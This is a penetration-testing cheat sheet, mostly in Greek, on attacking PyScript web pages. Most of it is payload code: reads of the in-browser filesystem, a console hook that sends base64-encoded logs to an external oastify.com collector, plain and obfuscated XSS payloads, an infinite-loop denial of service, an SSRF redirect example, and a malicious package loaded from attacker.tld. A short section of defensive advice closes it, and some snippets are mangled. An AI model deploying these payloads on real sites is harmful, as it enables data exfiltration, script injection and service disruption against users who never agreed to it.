# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## PyScript Pentesting Guide

Το PyScript είναι ένα νέο πλαίσιο που αναπτύχθηκε για την ενσωμάτωση της Python στο HTML, ώστε να μπορεί να χρησιμοποιηθεί παράλληλα με το HTML. Σε αυτό το cheat sheet, θα βρείτε πώς να χρησιμοποιήσετε το PyScript για τους σκοπούς της διείσδυσης σας.

### Dumping / Retrieving files from the Emscripten virtual memory filesystem:

`CVE ID: CVE-2022-30286`\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`\
\
Κώδικας:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Κανονικό)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Κώδικας:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Κώδικας:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### Επίθεση DoS (Ατέρμον βρόχο)

Code:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Νέες ευπάθειες & τεχνικές (2023-2025)

### Server-Side Request Forgery μέσω μη ελεγχόμενων ανακατευθύνσεων (CVE-2025-50182)

`urllib3 < 2.5.0` αγνοεί τις παραμέτρους `redirect` και `retries` όταν εκτελείται **μέσα στο περιβάλλον εκτέλεσης Pyodide** που συνοδεύει το PyScript. Όταν ένας επιτιθέμενος μπορεί να επηρεάσει τις στοχευμένες διευθύνσεις URL, μπορεί να αναγκάσει τον κώδικα Python να ακολουθήσει ανακατευθύνσεις μεταξύ τομέων ακόμη και όταν ο προγραμματιστής τις έχει απενεργοποιήσει ρητά ‑ παρακάμπτοντας αποτελεσματικά τη λογική κατά της SSRF.
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
Διορθώθηκε στο `urllib3 2.5.0` – αναβαθμίστε το πακέτο στην εικόνα PyScript σας ή καθορίστε μια ασφαλή έκδοση στο `packages = ["urllib3>=2.5.0"]`. Δείτε την επίσημη καταχώρηση CVE για λεπτομέρειες.

### Φόρτωση αυθαίρετων πακέτων & επιθέσεις εφοδιαστικής αλυσίδας

Δεδομένου ότι το PyScript επιτρέπει αυθαίρετες διευθύνσεις URL στη λίστα `packages`, ένας κακόβουλος παράγοντας που μπορεί να τροποποιήσει ή να εισάγει ρυθμίσεις μπορεί να εκτελέσει **εντελώς αυθαίρετο Python** στον περιηγητή του θύματος:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*Μόνο οι καθαροί τροχοί Python απαιτούνται – δεν χρειάζεται βήμα μεταγλώττισης WebAssembly.* Βεβαιωθείτε ότι η διαμόρφωση δεν ελέγχεται από τον χρήστη και φιλοξενήστε αξιόπιστους τροχούς στον τομέα σας με HTTPS & SRI hashes.

### Αλλαγές απολύμανσης εξόδου (2023+)

* `print()` εξακολουθεί να εισάγει ακατέργαστο HTML και είναι επομένως επιρρεπές σε XSS (παραδείγματα παραπάνω).
* Ο νεότερος βοηθός `display()` **διαφεύγει HTML από προεπιλογή** – η ακατέργαστη μορφοποίηση πρέπει να είναι περιτυλιγμένη σε `pyscript.HTML()`.
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Αυτή η συμπεριφορά εισήχθη το 2023 και τεκμηριώνεται στον επίσημο οδηγό Built-ins. Εξαρτηθείτε από το `display()` για μη αξιόπιστη είσοδο και αποφύγετε την άμεση κλήση του `print()`.

---

## Αμυντικές Καλές Πρακτικές

* **Διατηρήστε τα πακέτα ενημερωμένα** – αναβαθμίστε σε `urllib3 >= 2.5.0` και ανακατασκευάστε τακτικά τα wheels που αποστέλλονται με τον ιστότοπο.
* **Περιορίστε τις πηγές πακέτων** – αναφέρετε μόνο ονόματα PyPI ή URLs της ίδιας προέλευσης, ιδανικά προστατευμένα με Sub-resource Integrity (SRI).
* **Ενισχύστε την Πολιτική Ασφαλείας Περιεχομένου** – απαγορεύστε το inline JavaScript (`script-src 'self' 'sha256-…'`) ώστε να μην μπορούν να εκτελούνται τα εισαγόμενα μπλοκ `<script>`.
* **Απαγορεύστε τις ετικέτες `<py-script>` / `<script type="py">` που παρέχονται από τον χρήστη** – καθαρίστε το HTML στον διακομιστή πριν το επιστρέψετε σε άλλους χρήστες.
* **Απομονώστε τους εργαζόμενους** – αν δεν χρειάζεστε συγχρονισμένη πρόσβαση στο DOM από τους εργαζόμενους, ενεργοποιήστε τη σημαία `sync_main_only` για να αποφύγετε τις απαιτήσεις κεφαλίδας `SharedArrayBuffer`.

## Αναφορές

* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
* [Τεκμηρίωση Built-ins PyScript – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)

{{#include ../../banners/hacktricks-training.md}}
